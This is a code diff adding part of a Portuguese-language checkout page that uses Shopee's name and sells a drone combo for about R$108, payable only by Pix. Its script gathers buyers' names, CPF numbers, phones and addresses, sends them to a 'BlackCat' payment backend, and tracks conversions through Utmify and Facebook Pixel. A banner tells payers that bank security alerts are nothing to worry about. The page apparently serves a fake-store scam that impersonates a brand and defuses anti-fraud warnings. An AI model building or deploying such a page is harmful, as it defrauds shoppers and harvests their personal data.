+                        <div class="pix-code-label">Código Pix</div>
+                        <div class="pix-code-row">
+                            <div id="pix-code-display" class="pix-code-input">Carregando código...</div>
+                            <button class="btn-copy" onclick="copiarCodigoPix()">Copiar</button>
+                        </div>
+
+                        <div class="pix-warning">
+                            <div class="pix-warning-icon">!</div>
+                            <div>
+                                Os bancos reforçaram a segurança do Pix e podem exibir alertas
+                                preventivos durante o pagamento. Fique tranquilo — sua transação
+                                é segura e está totalmente protegida.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bank-list-card">
+                        <div class="bank-list-title">Pague com seu banco:</div>
+
+                        <div class="bank-row">
+                            <div class="bank-left">
+                                <div class="bank-logo-placeholder">Nu</div>
+                                <div>
+                                    <div class="bank-name">Nubank</div>
+                                    <div class="bank-note">Pode precisar criar manualmente</div>
+                                </div>
+                            </div>
+                            <div class="bank-right">Pix</div>
+                        </div>
+
+                        <div class="bank-row">
+                            <div class="bank-left">
+                                <div class="bank-logo-placeholder">in</div>
+                                <div>
+                                    <div class="bank-name">Banco Inter</div>
+                                    <div class="bank-note">Pode precisar criar manualmente</div>
+                                </div>
+                            </div>
+                            <div class="bank-right">Pix</div>
+                        </div>
+
+                        <div class="bank-row">
+                            <div class="bank-left">
+                                <div class="bank-logo-placeholder">it</div>
+                                <div>
+                                    <div class="bank-name">Itaú</div>
+                                    <div class="bank-note">Pode precisar criar manualmente</div>
+                                </div>
+                            </div>
+                            <div class="bank-right">Pix</div>
+                        </div>
+
+                        <div class="bank-row">
+                            <div class="bank-left">
+                                <div class="bank-logo-placeholder">bd</div>
+                                <div>
+                                    <div class="bank-name">Bradesco</div>
+                                    <div class="bank-note">Pode precisar criar manualmente</div>
+                                </div>
+                            </div>
+                            <div class="bank-right">Pix</div>
+                        </div>
+
+                        <div class="bank-row">
+                            <div class="bank-left">
+                                <div class="bank-logo-placeholder">BB</div>
+                                <div>
+                                    <div class="bank-name">Banco do Brasil</div>
+                                    <div class="bank-note">Pode precisar criar manualmente</div>
+                                </div>
+                            </div>
+                            <div class="bank-right">Pix</div>
+                        </div>
+
+                        <button class="btn-see-banks">Ver todos os bancos ▾</button>
+                    </div>
+
+                    <div class="how-to-pix-card">
+                        <div class="how-title">Como pagar o Pix:</div>
+                        <ul class="how-list">
+                            <li class="how-item">
+                                <div class="how-number">1</div>
+                                <div class="how-text">Clique em copiar o código Pix logo acima.</div>
+                            </li>
+                            <li class="how-item">
+                                <div class="how-number">2</div>
+                                <div class="how-text">Acesse o app do seu banco.</div>
+                            </li>
+                            <li class="how-item">
+                                <div class="how-number">3</div>
+                                <div class="how-text">Vá até a opção Pix.</div>
+                            </li>
+                            <li class="how-item">
+                                <div class="how-number">4</div>
+                                <div class="how-text">Escolha a opção “COPIAR E COLAR”.</div>
+                            </li>
+                            <li class="how-item">
+                                <div class="how-number">5</div>
+                                <div class="how-text">Insira o código copiado e finalize seu pagamento.</div>
+                            </li>
+                        </ul>
+
+                        <div class="status-line">
+                            <div class="status-dot"></div>
+                            <span id="pix-status-text">Aguardando pagamento...</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-title">Formas de Pagamento</div>
+            <div class="footer-icons">
+                <div class="footer-flag">VISA</div>
+                <div class="footer-flag">MASTERCARD</div>
+                <div class="footer-flag">ELO</div>
+                <div class="footer-flag">AMEX</div>
+                <div class="footer-flag">HIPER</div>
+                <div class="footer-flag">PIX</div>
+                <div class="footer-flag">BOLETO</div>
+            </div>
+
+            <div class="footer-address">
+                © 2025 Shopee. Todos os direitos reservados
+
+            </div>
+
+            <div class="footer-safe">
+                <div class="footer-safe-dot"></div>
+                <span>Site Seguro</span>
+            </div>
+        </footer>
+    </div>
+
+    <div id="modal-loading" class="modal-overlay hidden">
+        <div class="modal-card">
+            <div class="modal-spinner"></div>
+            <div class="modal-title">Aguarde enquanto geramos o QR Code</div>
+            <div class="modal-sub">Não feche ou atualize a página</div>
+        </div>
+    </div>
+
+    <script>
+        // ===== CONFIG GERAL =====
+        const PIX_AMOUNT_CENTS = 10792; // 107,92
+
+        // ===== BLACKCAT VIA BACKEND =====
+        // Agora o front chama apenas /api/blackcat e /api/blackcat-status e não expõe keys.
+
+        // ===== UTMIFY VIA BACKEND =====
+        // O token agora fica só no backend, aqui chamamos /api/utmify
+
+        let pixCodeGlobal = '';
+        let pixTimerInterval = null;
+        let pixStatusInterval = null;
+        let pixTransactionId = null;
+        let lastOrderId = null;
+
+        // controle de envio Utmify
+        let utmifyOrderCreatedAt = null;
+        let utmifyTrackingParams = null;
+
+        // ===== ANALYTICS DASHBOARD (Neon/Postgres via /api/track) =====
+        let sessionId = localStorage.getItem('gs_session_id');
+        if (!sessionId) {
+            if (window.crypto && crypto.randomUUID) {
+                sessionId = crypto.randomUUID();
+            } else {
+                sessionId = String(Date.now()) + '-' + Math.random().toString(16).slice(2);
+            }
+            localStorage.setItem('gs_session_id', sessionId);
+        }
+
+        function trackEvent(type, extra) {
+            try {
+                fetch('/api/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type,
+                        session_id: sessionId,
+                        ...(extra || {})
+                    })
+                });
+            } catch (e) {
+                console.warn('Erro ao enviar evento', type, e);
+            }
+        }
+
+        // ===== STEPS =====
+        function goToStep(stepNumber) {
+            const screens = { 1: 'screen-identificacao', 2: 'screen-endereco', 3: 'screen-pagamento', 4: 'screen-pix' };
+            document.querySelectorAll('.step-screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(screens[stepNumber]).classList.add('active');
+            document.querySelectorAll('.step-indicator').forEach(el => {
+                const label = Number(el.getAttribute('data-step-label'));
+                if (label <= 3) {
+                    el.classList.toggle('active', label === stepNumber);
+                }
+            });
+        }
+
+        // ===== FORMATADORES =====
+        function formatPhone(value) {
+            const digits = value.replace(/\D/g, '').slice(0, 11);
+            let r = digits;
+            if (digits.length <= 2) { r = digits ? `(${digits}` : '' }
+            else if (digits.length <= 7) { r = `(${digits.slice(0, 2)}) ${digits.slice(2)}` }
+            else if (digits.length <= 10) { r = `(${digits.slice(0, 2)}) ${digits.slice(2, 6)}-${digits.slice(6)}` }
+            else { r = `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}` }
+            return r;
+        }
+
+        function formatCPF(value) {
+            const d = value.replace(/\D/g, '').slice(0, 11);
+            if (d.length <= 3) return d;
+            if (d.length <= 6) return `${d.slice(0, 3)}.${d.slice(3)}`;
+            if (d.length <= 9) return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6)}`;
+            return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
+        }
+
+        function formatCEP(value) {
+            const d = value.replace(/\D/g, '').slice(0, 8);
+            if (d.length <= 5) return d;
+            return `${d.slice(0, 5)}-${d.slice(5)}`;
+        }
+
+        function formatarValorBRLcentavos(c) {
+            const v = c / 100;
+            return v.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        }
+
+        // ===== CEP VIA VIACEP =====
+        async function buscarCEP() {
+            const cepCampo = document.getElementById('cep');
+            const rua = document.getElementById('rua');
+            const bairro = document.getElementById('bairro');
+            const cidade = document.getElementById('cidade');
+            const estado = document.getElementById('estado');
+
+            const cep = cepCampo.value.replace(/\D/g, '');
+            if (cep.length !== 8) return;
+
+            try {
+                const resp = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+                const data = await resp.json();
+                if (data.erro) {
+                    alert('CEP não encontrado. Verifique o número digitado.');
+                    return;
+                }
+                rua.value = data.logradouro || '';
+                bairro.value = data.bairro || '';
+                cidade.value = data.localidade || '';
+                estado.value = data.uf || '';
+            } catch (e) {
+                console.error('Erro ao buscar CEP:', e);
+            }
+        }
+
+        // ===== FUNÇÕES UTMIFY =====
+        function formatUtc(date) {
+            const pad = n => String(n).padStart(2, '0');
+            return `${date.getUTCFullYear()}-${pad(date.getUTCMonth() + 1)}-${pad(date.getUTCDate())} ` +
+                `${pad(date.getUTCHours())}:${pad(date.getUTCMinutes())}:${pad(date.getUTCSeconds())}`;
+        }
+
+        function getTrackingParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                src: params.get('src'),
+                sck: params.get('sck'),
+                utm_source: params.get('utm_source'),
+                utm_campaign: params.get('utm_campaign'),
+                utm_medium: params.get('utm_medium'),
+                utm_content: params.get('utm_content'),
+                utm_term: params.get('utm_term')
+            };
+        }
+
+        // Envio para Utmify AGORA via backend (/api/utmify)
+        async function utmifySendPix(orderId, status, approvedDateOrNull) {
+            if (!utmifyOrderCreatedAt) {
+                utmifyOrderCreatedAt = formatUtc(new Date());
+            }
+            if (!utmifyTrackingParams) {
+                utmifyTrackingParams = getTrackingParams();
+            }
+
+            const nome = document.getElementById('nome-completo').value || 'Cliente';
+            const email = document.getElementById('email').value || '';
+            const fone = (document.getElementById('whatsapp').value || '').replace(/\D/g, '');
+            const cpf = (document.getElementById('cpf-pagador').value || '').replace(/\D/g, '');
+
+            const body = {
+                orderId: orderId,
+                platform: 'CheckoutProprio',
+                paymentMethod: 'pix',
+                status: status,
+                createdAt: utmifyOrderCreatedAt,
+                approvedDate: approvedDateOrNull,
+                refundedAt: null,
+                customer: {
+                    name: nome,
+                    email: email,
+                    phone: fone || null,
+                    document: cpf || null,
+                    country: 'BR'
+                },
+                products: [{
+                    id: 'combo-black-friday',
+                    name: 'Drone Mini 4 Pro Fly More Combo com câmera 4K cinza 3 baterias (Com Tela)',
+                    planId: null,
+                    planName: null,
+                    quantity: 1,
+                    priceInCents: PIX_AMOUNT_CENTS
+                }],
+                trackingParameters: utmifyTrackingParams,
+                commission: {
+                    totalPriceInCents: PIX_AMOUNT_CENTS,
+                    gatewayFeeInCents: 0,
+                    userCommissionInCents: PIX_AMOUNT_CENTS,
+                    currency: 'BRL'
+                }
+            };
+
+            try {
+                await fetch('/api/utmify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(body)
+                });
+            } catch (err) {
+                console.log('Erro ao enviar para Utmify:', err);
+            }
+        }
+
+        // ===== TIMER PIX =====
+        function iniciarPixTimer(segundos) {
+            if (pixTimerInterval) clearInterval(pixTimerInterval);
+            let restante = segundos;
+            const el = document.getElementById('pix-timer');
+
+            function render() {
+                const m = String(Math.floor(restante / 60)).padStart(2, '0');
+                const s = String(restante % 60).padStart(2, '0');
+                el.innerText = `${m}:${s}`;
+            }
+            render();
+
+            pixTimerInterval = setInterval(() => {
+                restante--;
+                if (restante <= 0) {
+                    clearInterval(pixTimerInterval);
+                    el.innerText = '00:00';
+                    document.getElementById('pix-status-text').innerText = 'Tempo expirado. Gere um novo código Pix para concluir o pagamento.';
+                    return;
+                }
+                render();
+            }, 1000);
+        }
+
+        // ===== POLLING STATUS PIX =====
+        async function consultarStatusPix() {
+            if (!pixTransactionId) return;
+            try {
+                const resp = await fetch(`/api/blackcat-status?transaction_id=${encodeURIComponent(pixTransactionId)}`, {
+                    method: 'GET'
+                });
+                const data = await resp.json();
+
+                if (!resp.ok) {
+                    console.log('Erro ao consultar transação:', data);
+                    return;
+                }
+
+                const tx = data.data || data;
+                const status = (tx.status || '').toLowerCase();
+
+                if (status === 'approved' || status === 'paid' || status === 'completed' || status === 'succeeded') {
+                    clearInterval(pixStatusInterval);
+                    document.getElementById('pix-status-text').innerText = 'Pagamento aprovado! Finalizando seu pedido...';
+
+                    // UTMIFY: PIX PAGO
+                    const approvedAtUtc = formatUtc(new Date());
+                    const orderRef = lastOrderId || tx.externalRef || String(tx.id || '');
+                    utmifySendPix(orderRef, 'paid', approvedAtUtc);
+
+                    // FACEBOOK PIXEL: Purchase (extra)
+                    if (window.fbq) {
+                        const value = (tx.amount || PIX_AMOUNT_CENTS) / 100;
+                        fbq('track', 'Purchase', {
+                            value: value,
+                            currency: 'BRL',
+                            contents: [{ id: 'combo-black-friday', quantity: 1 }],
+                            content_type: 'product',
+                            order_id: orderRef
+                        });
+                    }
+
+                    try {
+                        lastOrderId = tx.id || tx.transactionId || tx.referenceId || lastOrderId;
+                        localStorage.setItem('lastOrderId', lastOrderId || '');
+                        localStorage.setItem('lastOrderAmount', String(tx.amount || PIX_AMOUNT_CENTS));
+                    } catch (e) { }
+
+                    // DASHBOARD: pedido pago
+                    trackEvent('order_paid', {
+                        order_id: orderRef,
+                        value_in_cents: tx.amount || PIX_AMOUNT_CENTS
+                    });
+
+                    setTimeout(() => {
+                        window.location.href = 'pagamento-aprovado.html';
+                    }, 1500);
+
+                } else if (status === 'refused' || status === 'cancelled') {
+                    clearInterval(pixStatusInterval);
+                    document.getElementById('pix-status-text').innerText = 'Pagamento não aprovado. Gere um novo Pix.';
+                }
+            } catch (e) {
+                console.error('Erro ao consultar status Pix:', e);
+            }
+        }
+
+        function iniciarPollingStatus(transactionId) {
+            pixTransactionId = transactionId;
+            if (pixStatusInterval) clearInterval(pixStatusInterval);
+            pixStatusInterval = setInterval(consultarStatusPix, 8000);
+        }
+
+        // ===== GERAÇÃO PIX =====
+        async function gerarPix() {
+            const modal = document.getElementById('modal-loading');
+            modal.classList.remove('hidden');
+
+            try {
+                const pedidoId = 'PEDIDO-' + Math.floor(Math.random() * 999999);
+                lastOrderId = pedidoId;
+
+                // DASHBOARD: checkout iniciado
+                trackEvent('checkout_started', { order_id: pedidoId });
+
+                const nome = document.getElementById('nome-completo').value || 'Cliente';
+                const email = document.getElementById('email').value || 'cliente@example.com';
+                const telefone = document.getElementById('whatsapp').value || '';
+                const telefoneDigits = telefone.replace(/\D/g, '');
+                const cpf = document.getElementById('cpf-pagador').value || '';
+                const cpfDigits = cpf.replace(/\D/g, '');
+
+                const cep = document.getElementById('cep').value.replace(/\D/g, '');
+                const rua = document.getElementById('rua').value;
+                const numero = document.getElementById('numero').value;
+                const complemento = document.getElementById('complemento').value;
+                const bairro = document.getElementById('bairro').value;
+                const cidade = document.getElementById('cidade').value;
+                const estado = document.getElementById('estado').value;
+
+                const payload = {
+                    amount: PIX_AMOUNT_CENTS,
+                    paymentMethod: 'pix',
+                    postbackUrl: 'https://seusite.com/api/blackcat/webhook',
+                    externalRef: pedidoId,
+                    metadata: `{ orderId: "${pedidoId}" }`,
+                    customer: {
+                        name: nome,
+                        email: email,
+                        phone: telefoneDigits,
+                        birthdate: null,
+                        document: { type: 'cpf', number: cpfDigits },
+                        address: {
+                            street: rua,
+                            streetNumber: numero,
+                            complement: complemento,
+                            zipCode: cep,
+                            neighborhood: bairro,
+                            city: cidade,
+                            state: estado,
+                            country: 'BR'
+                        }
+                    },
+                    items: [{
+                        title: 'Drone Mini 4 Pro Fly More Combo com câmera 4K cinza 3 baterias (Com Tela)',
+                        quantity: 1,
+                        tangible: true,
+                        unitPrice: PIX_AMOUNT_CENTS,
+                        externalRef: 'item-1'
+                    }]
+                };
+
+                const resp = await fetch('/api/blackcat', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await resp.json();
+                if (!resp.ok) {
+                    console.error('Erro BlackCat:', data);
+                    alert('Erro ao gerar Pix. Verifique suas chaves/conta e tente novamente.');
+                    modal.classList.add('hidden');
+                    return;
+                }
+
+                const tx = data.data || data;
+                const pixInfo = tx.pix || {};
+                const pixCode = pixInfo.qrcode;
+
+                if (!pixCode) {
+                    alert('Não foi possível obter o código Pix da transação.');
+                    modal.classList.add('hidden');
+                    return;
+                }
+
+                pixCodeGlobal = pixCode;
+
+                // UTMIFY: PIX GERADO (aguardando pagamento)
+                utmifyOrderCreatedAt = formatUtc(new Date());
+                utmifySendPix(pedidoId, 'waiting_payment', null);
+
+                // DASHBOARD: Pix gerado
+                trackEvent('pix_generated', {
+                    order_id: pedidoId,
+                    value_in_cents: tx.amount || PIX_AMOUNT_CENTS
+                });
+
+                // FACEBOOK PIXEL: evento custom PixGenerated
+                if (window.fbq) {
+                    fbq('trackCustom', 'PixGenerated', {
+                        value: PIX_AMOUNT_CENTS / 100,
+                        currency: 'BRL',
+                        order_id: pedidoId,
+                        payment_method: 'pix'
+                    });
+                }
+
+                const valorFormatado = formatarValorBRLcentavos(tx.amount || PIX_AMOUNT_CENTS);
+                document.getElementById('pix-total-final').innerText = valorFormatado;
+                document.getElementById('pix-total-main').innerText = valorFormatado;
+                document.getElementById('pix-total-mini').innerHTML = '<strong>' + valorFormatado + '</strong>';
+                document.getElementById('pix-code-display').innerText = pixCode;
+
+                const qrContainer = document.getElementById('pix-qrcode');
+                qrContainer.innerHTML = '';
+                new QRCode(qrContainer, { text: pixCode, width: 170, height: 170 });
+
+                try {
+                    localStorage.setItem('lastOrderId', pedidoId);
+                    localStorage.setItem('lastOrderAmount', String(tx.amount || PIX_AMOUNT_CENTS));
+                } catch (e) { }
+
+                goToStep(4);
+                iniciarPixTimer(15 * 60);
+                iniciarPollingStatus(tx.id);
+            } catch (err) {
+                console.error(err);
+                alert('Erro inesperado ao gerar Pix. Tente novamente.');
+            } finally {
+                modal.classList.add('hidden');
+            }
+        }
+
+        function copiarCodigoPix() {
+            if (!pixCodeGlobal) {
+                alert('Código Pix ainda não carregado.');
+                return;
+            }
+            navigator.clipboard.writeText(pixCodeGlobal).then(() => {
+                alert('Código Pix copiado com sucesso!');
+            }).catch(() => {
+                const temp = document.createElement('textarea');
+                temp.value = pixCodeGlobal;
+                document.body.appendChild(temp);
+                temp.select();
+                document.execCommand('copy');
+                document.body.removeChild(temp);
+                alert('Código Pix copiado com sucesso!');
+            });
+        }
+
+        // ===== INIT LISTENERS =====
+        (function init() {
+            const optCredit = document.getElementById('opt-credit');
+            const optPix = document.getElementById('opt-pix');
+
+            // DASHBOARD: visita ao abrir o checkout
+            trackEvent('visit', {});
+
+            optCredit.addEventListener('click', () => {
+                optCredit.classList.add('active');
+                optPix.classList.remove('active');
+                alert('Exemplo: aqui entraria o formulário de cartão de crédito.\nNo momento o fluxo está focado em Pix.');
+            });
+
+            optPix.addEventListener('click', () => {
+                optPix.classList.add('active');
+                optCredit.classList.remove('active');
+            });
+
+            const telInput = document.getElementById('whatsapp');
+            telInput.addEventListener('input', e => {
+                e.target.value = formatPhone(e.target.value);
+            });
+
+            const cpfInput = document.getElementById('cpf-pagador');
+            cpfInput.addEventListener('input', e => {
+                e.target.value = formatCPF(e.target.value);
+            });
+
+            const cepInput = document.getElementById('cep');
+            cepInput.addEventListener('input', e => {
+                e.target.value = formatCEP(e.target.value);
+            });
+            cepInput.addEventListener('blur', buscarCEP);
+
+            // FACEBOOK PIXEL: InitiateCheckout assim que o checkout abrir
+            if (window.fbq) {
+                fbq('track', 'InitiateCheckout', {
+                    value: PIX_AMOUNT_CENTS / 100,
+                    currency: 'BRL',
+                    num_items: 1,
+                    contents: [{ id: 'combo-black-friday', quantity: 1 }],
+                    content_type: 'product'
+                });
+            }
+        })();
+    </script>
+
+
+
+</body>
+
+</html>
